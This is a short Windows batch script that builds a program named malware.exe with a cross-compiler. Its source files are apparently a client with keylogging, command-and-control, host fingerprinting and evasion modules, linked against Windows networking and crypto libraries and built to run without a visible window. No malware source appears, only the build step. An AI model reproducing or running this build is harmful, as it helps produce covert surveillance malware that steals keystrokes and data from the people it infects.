@echo off
:: Build for 32-bit Windows (hidden window version)
i686-w64-mingw32-gcc -o malware.exe ^
    client\main.c client\fingerprint.c client\c2.c client\keylogger.c client\utils.c ^
    client\evasion.c client\completion.c ^
    -lwininet -ladvapi32 -lcrypt32 -liphlpapi -lpsapi ^
    -mwindows -Wl,--subsystem,windows